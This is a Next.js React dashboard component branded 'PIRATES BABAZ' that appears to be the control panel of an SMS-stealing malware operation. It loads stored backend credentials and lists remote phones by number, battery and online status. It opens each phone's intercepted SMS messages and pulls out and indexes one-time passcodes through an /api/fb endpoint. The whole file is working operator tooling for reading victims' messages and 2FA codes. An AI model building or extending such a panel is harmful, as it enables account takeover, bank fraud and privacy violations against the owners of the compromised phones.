"use client";
import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { maskSession } from "@/lib/share";

const LS_ACCOUNTS = "pb_accounts";
const LS_ACTIVE = "pb_active";

export default function Dashboard() {
  const router = useRouter();
  const [active, setActive] = useState(null);
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(false);
  const [smsLoading, setSmsLoading] = useState(false);
  const [err, setErr] = useState("");
  const [q, setQ] = useState("");
  const [tab, setTab] = useState("all");
  const [smsOpen, setSmsOpen] = useState(null);
  const [messages, setMessages] = useState([]);
  const [smsFilter, setSmsFilter] = useState("");

  useEffect(() => {
    try {
      const acc = JSON.parse(localStorage.getItem(LS_ACCOUNTS) || "[]");
      const id = localStorage.getItem(LS_ACTIVE);
      const a = acc.find((x) => x.id === id) || acc[0];
      if (!a) {
        router.replace("/");
        return;
      }
      setActive(a);
    } catch {
      router.replace("/");
    }
  }, [router]);

  useEffect(() => {
    if (active) loadDevices();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [active]);

  async function api(payload) {
    const r = await fetch("/api/fb", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    return r.json();
  }

  async function loadDevices() {
    if (!active) return;
    setLoading(true);
    setErr("");
    try {
      const data = await api({ action: "devices", url: active.url, auth: active.auth || "" });
      if (!data.ok) throw new Error(data.error || "Failed");
      setDevices(data.devices || []);
    } catch (e) {
      setErr(String(e.message || e));
      setDevices([]);
    } finally {
      setLoading(false);
    }
  }

  async function openSms(device) {
    setSmsOpen(device);
    setMessages([]);
    setSmsLoading(true);
    try {
      const data = await api({
        action: "sms",
        url: active.url,
        auth: active.auth || "",
        deviceId: device.id,
      });
      setMessages(data.messages || []);
    } catch {
      setMessages([]);
    } finally {
      setSmsLoading(false);
    }
  }

  function logout() {
    localStorage.removeItem(LS_ACTIVE);
    router.push("/");
  }

  const filtered = useMemo(() => {
    let list = devices;
    if (tab === "online") list = list.filter((d) => d.online);
    if (tab === "offline") list = list.filter((d) => !d.online);
    if (q.trim()) {
      const s = q.trim().toLowerCase();
      list = list.filter(
        (d) =>
          d.id.toLowerCase().includes(s) ||
          (d.phone || "").includes(s) ||
          (d.name || "").toLowerCase().includes(s)
      );
    }
    return list;
  }, [devices, tab, q]);

  const online = devices.filter((d) => d.online).length;
  const offline = devices.length - online;

  const smsFiltered = useMemo(() => {
    if (!smsFilter.trim()) return messages;
    const s = smsFilter.toLowerCase();
    return messages.filter(
      (m) =>
        (m.body || "").toLowerCase().includes(s) ||
        (m.sender || "").toLowerCase().includes(s) ||
        (m.otp || "").includes(s)
    );
  }, [messages, smsFilter]);

  const title = active?.hidden
    ? active.label || "Shared Session"
    : active?.label || maskSession("", active?.url);

  return (
    <div className="container">
      <div className="topbar">
        <div className="brand">
          <div className="logo">PB</div>
          <div>
            <div>PIRATES BABAZ</div>
            <div style={{ color: "var(--muted)", fontSize: 12 }}>{title}</div>
          </div>
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <span className="pill ok">● Connected</span>
          <button className="btn" onClick={loadDevices}>Refresh</button>
          <button className="btn ghost" onClick={logout}>Logout</button>
        </div>
      </div>

      <div className="stats">
        <div className="stat"><div className="k">TOTAL</div><div className="v">{devices.length}</div></div>
        <div className="stat"><div className="k">ONLINE</div><div className="v" style={{ color: "#86efac" }}>{online}</div></div>
        <div className="stat"><div className="k">OFFLINE</div><div className="v">{offline}</div></div>
        <div className="stat"><div className="k">SMS</div><div className="v">—</div></div>
      </div>

      <div className="toolbar">
        <input placeholder="Search devices..." value={q} onChange={(e) => setQ(e.target.value)} />
        <div className="tabs">
          {["all", "online", "offline"].map((t) => (
            <div key={t} className={`tab ${tab === t ? "active" : ""}`} onClick={() => setTab(t)}>
              {t[0].toUpperCase() + t.slice(1)}
            </div>
          ))}
        </div>
      </div>

      {err && <div className="err">{err}</div>}
      {loading && <div className="empty">Loading devices...</div>}
      {!loading && filtered.length === 0 && <div className="empty">No devices found</div>}

      <div className="grid">
        {filtered.map((d) => (
          <div className="card" key={d.id} onClick={() => openSms(d)} style={{ cursor: "pointer" }}>
            <div className="head">
              <div>
                <div className="id">{d.phone || d.name || d.id}</div>
                <div className="sub">{d.id}</div>
              </div>
              <button className="btn" onClick={(e) => { e.stopPropagation(); openSms(d); }}>SMS</button>
            </div>
            <div className="meta">
              <div>
                <div className="label">BATTERY</div>
                <div className="val" style={{ color: d.battery == null ? "var(--muted)" : d.battery < 20 ? "#fca5a5" : d.battery < 50 ? "#fde68a" : "#86efac" }}>
                  {d.battery == null ? "—" : `${d.battery}%`}
                </div>
              </div>
              <div>
                <div className="label">NUMBER</div>
                <div className="val">{d.phone || "—"}</div>
              </div>
              <div>
                <div className="label">STATUS</div>
                <div className="status">
                  <span className={`dot ${d.online ? "on" : "off"}`} />
                  {d.online ? "Online" : "Offline"}
                </div>
              </div>
            </div>
          </div>
        ))}
      </div>

      {smsOpen && (
        <div className="modal-bg" onClick={() => setSmsOpen(null)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <div style={{ display: "flex", justifyContent: "space-between" }}>
              <h3 style={{ margin: 0 }}>SMS / OTP · {smsOpen.phone || smsOpen.id}</h3>
              <button className="btn ghost" onClick={() => setSmsOpen(null)}>Close</button>
            </div>
            <input
              style={{ width: "100%", margin: "12px 0", padding: 10, borderRadius: 10, border: "1px solid var(--line)", background: "#0b1220", color: "white" }}
              placeholder="Filter SMS / OTP..."
              value={smsFilter}
              onChange={(e) => setSmsFilter(e.target.value)}
            />
            {smsLoading && <div className="empty">Loading SMS...</div>}
            {!smsLoading && smsFiltered.length === 0 && <div className="empty">No SMS found</div>}
            {smsFiltered.map((m) => (
              <div className="sms-row" key={m.key}>
                <div className="s">{m.sender || "Unknown"} · {m.ts || m.key}</div>
                <div>{m.body}</div>
                {m.otp && <div className="otp">OTP: {m.otp}</div>}
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
